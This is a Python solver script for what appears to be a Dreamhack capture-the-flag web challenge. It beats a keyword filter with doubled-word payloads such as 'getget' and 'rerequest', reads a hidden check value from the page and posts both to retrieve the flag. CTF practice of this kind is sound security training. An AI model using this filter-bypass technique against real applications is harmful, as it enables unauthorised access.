from bs4 import BeautifulSoup
import requests

URL = "http://host1.dreamhack.games:19577"
STEP1 = '/step1'
STEP2 = '/step2'
FLAG = '/flag'
PAYLOAD01 = ['getget', 'rerequest']
PAYLOAD02 = ['pooost', 'requeeest']
DATA01 = {'param': PAYLOAD01[0], 'param2': PAYLOAD01[1]}

resp = requests.get(URL + STEP1, params=DATA01)
soup = BeautifulSoup(resp.text,"html.parser")
CHECK = soup.find('input',{'type':'hidden'}).get('value')

DATA02 = {'param': PAYLOAD02[0], 'param2': PAYLOAD02[1], 'check': CHECK}

resp = requests.post(URL + FLAG, data=DATA02)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('pre')
flag = pre.contents[0]
print(flag)